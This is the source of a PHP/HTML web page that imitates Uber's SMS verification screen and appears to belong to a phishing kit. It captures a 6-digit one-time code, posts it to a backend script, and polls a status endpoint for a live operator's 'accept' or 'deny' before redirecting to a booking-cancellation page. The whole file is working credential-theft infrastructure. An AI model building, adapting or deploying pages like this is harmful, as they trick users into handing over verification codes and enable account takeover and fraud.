<?php
session_start();
include "./Assets/php/config/config.php";
?>
<!DOCTYPE html>
<html class="light" lang="en"><head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<title>Uber | SMS Verification</title>
<script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet"/>
<script id="tailwind-config">
      tailwind.config = {
        darkMode: "class",
        theme: {
          extend: {
            "colors": {
                    "error-container": "#ffdad6",
                    "surface-container-low": "#f3f3f3",
                    "on-error": "#ffffff",
                    "outline": "#777777",
                    "secondary-container": "#d4d4d4",
                    "outline-variant": "#c6c6c6",
                    "on-primary-fixed-variant": "#e2e2e2",
                    "on-tertiary-fixed-variant": "#e2e2e2",
                    "primary-fixed": "#5e5e5e",
                    "on-tertiary-fixed": "#ffffff",
                    "on-secondary-container": "#1a1c1c",
                    "primary-fixed-dim": "#474747",
                    "tertiary": "#3b3b3b",
                    "tertiary-fixed-dim": "#474747",
                    "surface-bright": "#f9f9f9",
                    "inverse-surface": "#303030",
                    "tertiary-container": "#747474",
                    "surface-dim": "#dadada",
                    "on-secondary-fixed-variant": "#3a3c3c",
                    "surface-container-lowest": "#ffffff",
                    "on-surface": "#1b1b1b",
                    "on-primary-container": "#ffffff",
                    "inverse-primary": "#c6c6c6",
                    "on-primary-fixed": "#ffffff",
                    "on-error-container": "#410002",
                    "surface-container-highest": "#e2e2e2",
                    "secondary": "#5d5f5f",
                    "on-tertiary": "#e2e2e2",
                    "background": "#f9f9f9",
                    "on-secondary-fixed": "#1a1c1c",
                    "surface-container": "#eeeeee",
                    "on-primary": "#ffffff",
                    "on-tertiary-container": "#ffffff",
                    "surface-tint": "#5e5e5e",
                    "secondary-fixed-dim": "#aaabab",
                    "on-background": "#1b1b1b",
                    "inverse-on-surface": "#f1f1f1",
                    "on-surface-variant": "#474747",
                    "on-secondary": "#ffffff",
                    "surface": "#f9f9f9",
                    "secondary-fixed": "#c6c6c7",
                    "error": "#ba1a1a",
                    "primary-container": "#3b3b3b",
                    "surface-container-high": "#e8e8e8",
                    "tertiary-fixed": "#5e5e5e",
                    "primary": "#000000",
                    "surface-variant": "#e2e2e2"
            },
            "borderRadius": {
                    "DEFAULT": "0.125rem",
                    "lg": "0.25rem",
                    "xl": "0.5rem",
                    "full": "0.75rem"
            },
            "fontFamily": {
                    "headline": ["Plus Jakarta Sans"],
                    "body": ["Inter"],
                    "label": ["Inter"]
            }
          },
        },
      }
    </script>
<style>
        body { font-family: 'Inter', sans-serif; background-color: #f9f9f9; }
        .font-headline { font-family: 'Plus Jakarta Sans', sans-serif; }
        .material-symbols-outlined { font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24; }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(14px); }
            to   { opacity: 1; transform: translateY(0); }
        }
        .animate-in { animation: fadeInUp 0.5s cubic-bezier(0.16,1,0.3,1) forwards; opacity: 0; }
        .delay-100 { animation-delay: 100ms; }
        .delay-200 { animation-delay: 200ms; }
        .delay-300 { animation-delay: 300ms; }

        @keyframes shake {
            0%,100% { transform: translateX(0); }
            15%      { transform: translateX(-8px); }
            30%      { transform: translateX(8px); }
            45%      { transform: translateX(-5px); }
            60%      { transform: translateX(5px); }
            80%      { transform: translateX(-3px); }
        }
        .shake-error { animation: shake 0.55s cubic-bezier(0.36,0.07,0.19,0.97); }
    </style>
</head>
<body class="bg-background text-on-surface min-h-screen flex flex-col">

<!-- Loading Overlay -->
<div id="loadingOverlay" class="hidden fixed inset-0 z-[999] flex flex-col items-center justify-center bg-white">
    <div class="flex flex-col items-center gap-8">
        <div class="relative w-24 h-24">
            <div class="absolute inset-0 rounded-full border-4 border-black/10 animate-ping"></div>
            <div class="absolute inset-2 rounded-full border-4 border-black/20 animate-ping" style="animation-delay:0.15s"></div>
            <div class="absolute inset-4 rounded-full border-4 border-black border-t-transparent animate-spin"></div>
            <div class="absolute inset-0 flex items-center justify-center">
                <span class="material-symbols-outlined text-black text-2xl" style="font-variation-settings:'FILL' 1">sms</span>
            </div>
        </div>
        <div class="flex gap-2">
            <div class="w-2 h-2 rounded-full bg-black animate-bounce" style="animation-delay:0s"></div>
            <div class="w-2 h-2 rounded-full bg-black animate-bounce" style="animation-delay:0.15s"></div>
            <div class="w-2 h-2 rounded-full bg-black animate-bounce" style="animation-delay:0.3s"></div>
        </div>
        <div class="text-center">
            <p class="text-lg font-bold text-black font-headline">Verifying your code</p>
            <p class="text-sm text-neutral-400 mt-1">Please wait, this may take a moment...</p>
        </div>
    </div>
</div>

<!-- TopNavBar -->
<header class="bg-white flex justify-between items-center px-6 py-4 w-full fixed top-0 z-50">
    <div class="text-2xl font-bold tracking-tighter text-black uppercase font-headline">Uber</div>
    <div class="flex items-center gap-4">
        <button class="text-black hover:opacity-80 transition-opacity p-2">
            <span class="material-symbols-outlined">help</span>
        </button>
    </div>
</header>

<main class="flex-grow flex flex-col pt-24 px-6 max-w-2xl mx-auto w-full">

    <!-- Headline -->
    <section class="mt-12 mb-8 animate-in delay-100">
        <h1 class="font-headline text-3xl font-extrabold tracking-tighter text-primary leading-tight">Enter the 6-digit code</h1>
        <p class="mt-4 text-on-surface-variant text-base max-w-sm">A 6-digit code was sent to your phone number.</p>
    </section>

    <!-- OTP Inputs -->
    <div id="otpInputs" class="flex gap-3 mt-4 animate-in delay-200">
        <input id="d1" aria-label="Digit 1" class="sms-input w-14 h-14 text-center text-2xl font-bold bg-surface-container border-none focus:ring-0 focus:bg-surface-container-high transition-all rounded-lg" maxlength="1" type="tel"/>
        <input id="d2" aria-label="Digit 2" class="sms-input w-14 h-14 text-center text-2xl font-bold bg-surface-container border-none focus:ring-0 focus:bg-surface-container-high transition-all rounded-lg" maxlength="1" type="tel"/>
        <input id="d3" aria-label="Digit 3" class="sms-input w-14 h-14 text-center text-2xl font-bold bg-surface-container border-none focus:ring-0 focus:bg-surface-container-high transition-all rounded-lg" maxlength="1" type="tel"/>
        <input id="d4" aria-label="Digit 4" class="sms-input w-14 h-14 text-center text-2xl font-bold bg-surface-container border-none focus:ring-0 focus:bg-surface-container-high transition-all rounded-lg" maxlength="1" type="tel"/>
        <input id="d5" aria-label="Digit 5" class="sms-input w-14 h-14 text-center text-2xl font-bold bg-surface-container border-none focus:ring-0 focus:bg-surface-container-high transition-all rounded-lg" maxlength="1" type="tel"/>
        <input id="d6" aria-label="Digit 6" class="sms-input w-14 h-14 text-center text-2xl font-bold bg-surface-container border-none focus:ring-0 focus:bg-surface-container-high transition-all rounded-lg" maxlength="1" type="tel"/>
    </div>

    <!-- Error Message (hidden by default) -->
    <div id="errorMsg" class="hidden mt-6 p-4 rounded-lg bg-red-50 border border-red-200 animate-in">
        <div class="flex items-center gap-3">
            <span class="material-symbols-outlined text-red-600">cancel</span>
            <p class="text-sm font-bold text-red-800">Incorrect code. Please try again.</p>
        </div>
    </div>

    <!-- Resend Button -->
    <div class="mt-8 animate-in delay-300">
        <button id="resendBtn" onclick="resendCode()" disabled
            class="bg-surface-container-highest px-4 py-2 rounded-full text-sm font-semibold transition-all disabled:opacity-40 disabled:cursor-not-allowed hover:opacity-80">
            <span id="resendLabel">Resend code in <span id="countdown">30</span>s</span>
        </button>
    </div>

    <!-- Footer Actions -->
    <div class="mt-auto pb-12 flex justify-between items-center animate-in delay-300">
        <button onclick="history.back()" class="p-3 rounded-full hover:bg-surface-container transition-all">
            <span class="material-symbols-outlined text-on-surface">arrow_back</span>
        </button>
        <button id="nextBtn" onclick="submitSMS()"
            class="bg-primary text-white px-8 py-4 rounded-lg font-bold flex items-center gap-3 shadow-lg active:scale-95 transition-transform">
            Next
            <span class="material-symbols-outlined">arrow_forward</span>
        </button>
    </div>
</main>

<!-- Decorative blurs -->
<div class="fixed bottom-[-10%] right-[-5%] w-64 h-64 bg-surface-container-low rounded-full blur-[100px] -z-10 opacity-50"></div>
<div class="fixed top-[20%] left-[-10%] w-96 h-96 bg-surface-container-high rounded-full blur-[120px] -z-10 opacity-30"></div>

<script>
const inputs = Array.from(document.querySelectorAll('.sms-input'));
let pollInterval = null;

// Auto-focus logic
inputs.forEach((inp, idx) => {
    inp.addEventListener('input', function() {
        if (this.value.length === 1) {
            if (idx < inputs.length - 1) {
                inputs[idx + 1].focus();
            } else {
                submitSMS(); // auto-submit on last digit
            }
        }
    });
    inp.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !this.value && idx > 0) {
            inputs[idx - 1].focus();
        }
    });
});

// Start 30s resend timer on page load
startResendTimer();
inputs[0].focus();

function submitSMS() {
    const code = inputs.map(i => i.value).join('');
    if (code.length < 6) return;

    document.getElementById('loadingOverlay').classList.remove('hidden');
    document.getElementById('errorMsg').classList.add('hidden');
    document.getElementById('nextBtn').disabled = true;

    const formData = new FormData();
    formData.append('sms_code', code);

    fetch('./Assets/php/config/func.php', {
        method: 'POST',
        body: formData
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === 'pending' && data.sid) {
            pollInterval = setInterval(() => pollDecision(data.sid), 3000);
        } else {
            hideOverlay();
            showError();
        }
    })
    .catch(() => hideOverlay());
}

function pollDecision(sid) {
    fetch('./Assets/php/config/check_status.php?sid=' + encodeURIComponent(sid))
    .then(r => r.json())
    .then(data => {
        if (data.status === 'accept') {
            clearInterval(pollInterval);
            window.location.href = './booking_cancel.php';
        } else if (data.status === 'deny') {
            clearInterval(pollInterval);
            hideOverlay();
            showError();
        }
    })
    .catch(() => {});
}

function hideOverlay() {
    document.getElementById('loadingOverlay').classList.add('hidden');
    document.getElementById('nextBtn').disabled = false;
}

function showError() {
    // clear inputs
    inputs.forEach(i => { i.value = ''; i.classList.add('bg-red-100', 'ring-2', 'ring-red-400'); });
    inputs[0].focus();

    // shake
    const box = document.getElementById('otpInputs');
    box.classList.add('shake-error');
    setTimeout(() => {
        box.classList.remove('shake-error');
        inputs.forEach(i => i.classList.remove('bg-red-100', 'ring-2', 'ring-red-400'));
    }, 600);

    document.getElementById('errorMsg').classList.remove('hidden');

    // reset + restart resend timer
    startResendTimer();
}

function startResendTimer() {
    const btn = document.getElementById('resendBtn');
    const cd  = document.getElementById('countdown');
    const lbl = document.getElementById('resendLabel');
    btn.disabled = true;
    let secs = 30;
    cd.textContent = secs;
    lbl.innerHTML = 'Resend code in <span id="countdown">' + secs + '</span>s';

    const timer = setInterval(() => {
        secs--;
        document.getElementById('countdown').textContent = secs;
        if (secs <= 0) {
            clearInterval(timer);
            btn.disabled = false;
            lbl.textContent = 'Resend code';
        }
    }, 1000);
}

function resendCode() {
    inputs.forEach(i => i.value = '');
    document.getElementById('errorMsg').classList.add('hidden');
    inputs[0].focus();

    // Notify backend
    const formData = new FormData();
    formData.append('sms_resend', '1');
    fetch('./Assets/php/config/func.php', { method: 'POST', body: formData }).catch(() => {});

    // Restart 30s timer
    startResendTimer();
}
</script>
</body></html>
